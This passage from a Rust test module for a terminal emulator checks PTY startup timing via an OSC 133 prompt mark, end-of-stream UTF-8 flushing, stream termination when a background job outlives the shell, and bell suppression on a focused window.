        // End to end through a real fork, PTY, gather thread, and parser: the clock starts
        // at the fork and the child's own `OSC 133;A` is what stops it. This is the path
        // the shell integration drives, with the shim's one byte sequence standing in for
        // the shim.
        let mut core = TerminalCore::new(false, geom(40, 10, 320, 160));
        if core
            .spawn_program(&["/bin/sh", "-c", "printf '\\033]133;A\\007'"])
            .is_err()
        {
            eprintln!("fork/exec unavailable; skipping the live startup-clock test");
            return;
        }

        let stop = Instant::now() + Duration::from_secs(5);
        let mut took = None;
        while Instant::now() < stop && took.is_none() {
            let _ = core.pump(1 << 20, Instant::now() + Duration::from_millis(50));
            took = core.take_startup_time();
            if took.is_none() {
                std::thread::sleep(Duration::from_millis(5));
            }
        }
        let took = took.expect("the child's prompt mark never stopped the clock");
        assert!(
            took > Duration::ZERO && took < Duration::from_secs(5),
            "a real fork-to-prompt interval: {took:?}"
        );
        // Hang up the PTY and hand the child off, so nothing outlives the test.
        let _ = core.into_child();
    }

    #[test]
    fn a_child_that_exits_mid_character_flushes_through_the_pump() {
        // The regression guard for the end-of-stream UTF-8 flush, driven through the real
        // `pump` and the gatherer's completion rather than by calling `Parser::finish` by
        // hand: the child's last act is to write half a crab (the first two bytes of
        // U+1F980) and exit, and the flush must happen because `pump` sees the EOF marker.
        // Delete the `finish` call in `pump` and this goes red; a hand-rolled `finish`
        // would not.
        let Ok(pty) = Pty::spawn_command(40, 10, &["/bin/sh", "-c", "printf '\\360\\237'"]) else {
            eprintln!("fork/exec unavailable; skipping the end-of-stream pump test");
            return;
        };
        let Ok(gatherer) = Gatherer::start(pty.fd(), pty.exit_fd()) else {
            eprintln!("gatherer unavailable; skipping the end-of-stream pump test");
            return;
        };
        let mut core = TerminalCore::new(false, geom(40, 10, 400, 200));
        core.pty = Some(pty);
        core.gatherer = Some(gatherer);

        // Pump until the gatherer reports the child is gone, blocking on its ready fd
        // between passes so this does not spin, and bounded so a stuck child fails the
        // test rather than hanging the suite.
        let mut poll = crate::pty::PollSet::new();
        let stop = Instant::now() + Duration::from_secs(5);
        let mut ended = false;
        while Instant::now() < stop {
            let outcome = core
                .pump(1 << 20, Instant::now() + Duration::from_millis(50))
                .expect("pump");
            if outcome.end.is_some() {
                ended = true;
                break;
            }
            poll.clear();
            if let Some(g) = &core.gatherer {
                poll.add(g.ready_fd());
            }
            let _ = poll.wait(Some(Duration::from_millis(50)));
        }
        assert!(ended, "the child never reached EOF through the gatherer");
        assert_eq!(
            core.screen.row_string(0).chars().next(),
            Some('\u{FFFD}'),
            "pump flushed the held half-character to a replacement at end of stream"
        );
    }

    #[test]
    fn a_shell_that_leaves_a_job_running_still_ends_its_stream() {
        // `sleep 300 & exit` in an interactive shell: the job outlives the shell and keeps
        // the PTY slave open, so the master never reports end of file. Ignoring SIGHUP
        // keeps this job alive past the shell's exit as job control would. The stream must
        // end when the shell does, after the shell's last output.
        let script = "trap '' HUP; sleep 10 & printf done";
        let Ok(pty) = Pty::spawn_command(40, 10, &["/bin/sh", "-c", script]) else {
            eprintln!("fork/exec unavailable; skipping the outliving-job test");
            return;
        };
        if pty.exit_fd().is_none() {
            eprintln!("pidfd_open unavailable; skipping the outliving-job test");
            return;
        }
        let Ok(gatherer) = Gatherer::start(pty.fd(), pty.exit_fd()) else {
            eprintln!("gatherer unavailable; skipping the outliving-job test");
            return;
        };
        let mut core = TerminalCore::new(false, geom(40, 10, 400, 200));
        core.pty = Some(pty);
        core.gatherer = Some(gatherer);

        // Bounded well inside the job's lifetime, so only the shell's exit can end it.
        let mut poll = crate::pty::PollSet::new();
        let stop = Instant::now() + Duration::from_secs(5);
        let mut ended = false;
        while Instant::now() < stop {
            let outcome = core
                .pump(1 << 20, Instant::now() + Duration::from_millis(50))
                .expect("pump");
            if outcome.end.is_some() {
                ended = true;
                break;
            }
            poll.clear();
            if let Some(g) = &core.gatherer {
                poll.add(g.ready_fd());
            }
            let _ = poll.wait(Some(Duration::from_millis(50)));
        }
        assert!(
            ended,
            "the stream stayed open while the shell's job held the PTY"
        );
        assert_eq!(
            core.screen.row_string(0).trim_end(),
            "done",
            "the shell's last output arrived before the end"
        );
    }

    #[test]
    fn a_focused_surface_swallows_the_bell() {
        // A visual bell only means something on a window you are not watching. Focused,
        // you are the one driving the child (a shell tab-completing against nothing rings
        // the bell on every miss), so the flash would be feedback on your own keystrokes:
        // pure noise. The BEL is swallowed, and the surface never lifts.
        let mut core = core_80x24(true);
        core.focused = true;
        let calm = core.clear_color();

        core.feed_test_bytes(b"\x07");
        assert!(!core.bell_flashing(), "focused: the bell is swallowed");
        assert_eq!(core.clear_color(), calm, "so the surface never lifts");
        assert!(core.bell_until.is_none(), "and no deadline is armed");

        // The swallow consumed the flag rather than parking it, so simply losing focus
        // does not fire the bell that already rang; only a fresh BEL does.
        core.focused = false;
        core.feed_test_bytes(b"");
        assert!(
            !core.bell_flashing(),
            "the earlier bell does not resurface on blur"
        );

        core.feed_test_bytes(b"\x07");
        assert!(
            core.bell_flashing(),
            "unfocused: a fresh bell pulls the eye back"
        );
    }
}
